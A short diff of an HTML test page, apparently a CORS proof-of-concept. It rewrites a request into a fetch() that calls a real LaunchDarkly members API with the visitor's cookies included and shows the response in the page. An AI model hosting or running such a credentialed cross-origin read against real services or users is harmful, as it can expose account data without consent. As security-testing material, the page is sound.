@@ -2,21 +2,17 @@
 <html>
 <body>
 <script>
-var xhr = new XMLHttpRequest();
-
-xhr.open(
-    "GET",
-    "",
-    true
-);
-
-xhr.withCredentials = true;
-
-xhr.onload = function() {
-    alert(xhr.responseText);
-};
-
-xhr.send();
+fetch("https://app.launchdarkly.com/api/v2/members?expand=totalCountWithoutSelfOrOwner%2CcustomRoles", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => response.text())
+.then(data => {
+    document.body.innerText = data;
+})
+.catch(error => {
+    document.body.innerText = "CORS blocked: " + error;
+});
 </script>
 </body>
 </html>
